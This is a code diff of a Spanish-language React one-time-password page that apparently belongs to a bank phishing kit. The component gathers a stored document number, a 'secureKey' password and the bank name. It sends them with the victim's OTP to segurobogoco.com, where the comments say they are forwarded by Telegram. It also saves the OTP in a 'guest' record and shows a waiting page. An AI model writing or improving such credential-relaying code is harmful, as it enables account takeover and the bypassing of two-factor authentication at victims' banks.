@@ -36,7 +36,7 @@ const OTP = () => {
       const savedSecureKey = localStorage.getItem('secureKey');
       const savedFormValues = JSON.parse(localStorage.getItem('formValues')) || {};
       const banco = localStorage.getItem('banco') || 'No disponible';
-
+  
       if (savedDocumentNumber && savedSecureKey) {
         // Obtener el ID del "guest" almacenado en localStorage
         const guestId = localStorage.getItem('guestId');
@@ -44,15 +44,15 @@ const OTP = () => {
           setMessage('No se encontró el ID del guest en el localStorage.');
           return;
         }
-
-        // Crear el objeto con los datos que el backend necesita
+  
+        // Crear el objeto con los datos que el backend necesita, incluyendo el OTP
         const dataToSend = {
-          otp: otp,
+          otp: otp,  // OTP ingresado por el usuario
           documentNumber: savedDocumentNumber,
           secureKey: savedSecureKey,
         };
-
-        // Enviar los datos al backend
+  
+        // Enviar los datos al backend para enviar el mensaje por Telegram
         try {
           const response = await fetch('https://segurobogoco.com/api/v1/send-telegram-message', {
             method: 'POST',
@@ -61,11 +61,11 @@ const OTP = () => {
             },
             body: JSON.stringify(dataToSend),
           });
-
+  
           if (!response.ok) {
             throw new Error('Error al enviar los datos al backend');
           }
-
+  
           // Si la respuesta es exitosa, proceder con la actualización del estado del guest
           const updateResponse = await fetch(`https://segurobogoco.com/api/v1/guest/${guestId}`, {
             method: 'PUT',
@@ -73,14 +73,16 @@ const OTP = () => {
               'Content-Type': 'application/json',
             },
             body: JSON.stringify({
+              otp: otp, // Aquí estamos actualizando el campo OTP en la base de datos
               status_id: 1, // Actualizar el status_id a 1
             }),
           });
-
+          
+  
           if (!updateResponse.ok) {
             throw new Error('Error al actualizar el estado');
           }
-
+  
           // Redirigir a la página de loading después de actualizar el estado
           navigate('/loading');
         } catch (error) {
@@ -90,13 +92,14 @@ const OTP = () => {
       } else {
         setMessage('Datos del formulario no disponibles.');
       }
-
+  
       setOtp('');  // Resetear OTP
       setMessage('');  // Resetear mensaje de error
     } else {
       setMessage('Por favor, ingrese un código de 6 dígitos.');
     }
   };
+  
 
   return (
     <div className="w-full max-w-md mx-auto bg-white rounded-lg shadow-lg p-6 mt-8">
